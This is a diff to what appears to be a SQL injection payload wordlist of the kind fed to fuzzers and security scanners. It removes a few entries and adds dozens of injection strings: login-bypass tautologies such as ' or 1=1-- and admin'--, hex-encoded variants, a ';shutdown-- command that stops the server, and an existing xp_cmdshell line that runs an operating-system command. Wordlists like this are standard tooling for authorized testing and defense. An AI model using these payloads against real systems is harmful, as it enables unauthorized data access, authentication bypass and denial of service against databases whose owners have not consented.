@@ -39,7 +39,6 @@ x' AND members.email IS NULL; --
 x' OR full_name LIKE '%Bob%
 23 OR 1=1
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
-'
 '%20or%20''='
 '%20or%20'x'='x
 %20or%20x=x
@@ -55,7 +54,6 @@ or 0=0 #
 " or 1=1--
 ' or '1'='1'--
 ' or 1 --'
-or 1=1--
 or%201=1
 or%201=1 --
 ' or 1=1 or ''='
@@ -138,7 +136,6 @@ char%4039%41%2b%40SELECT
 %26
 !
 %21
-' or 1=1 or ''='
 ' or ''='
 x' or 1=1 or 'x'='y
 /
@@ -149,3 +146,46 @@ a' or 3=3--
 "a"" or 3=3--"
 ' or 3=3
 ý or 3=3 --
+"
+#
+-
+--
+' --
+--';
+' ;
+= '
+= ;
+= --
+\x23
+\x27
+\x3D \x3B'
+\x3D \x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or select *
+admin'--
+';shutdown--
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+" or 0=0 #
+"' or 1 --'"
+" or 1=1 or ""="
+" or "a"="a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi") or ("a"="a
+&lt;&gt;&quot;'%;)(&amp;+
+' and '' like '
+' AnD '' like '
+' or '' like '
+' and '' like '%
+' aND '' like '%
+' and '' like ''--
+' and 2>1--
+' and 2>3--
+') and ('x'='x
+) and (1=1
+¡® or 1=1 --
+¡® or 3=3 --
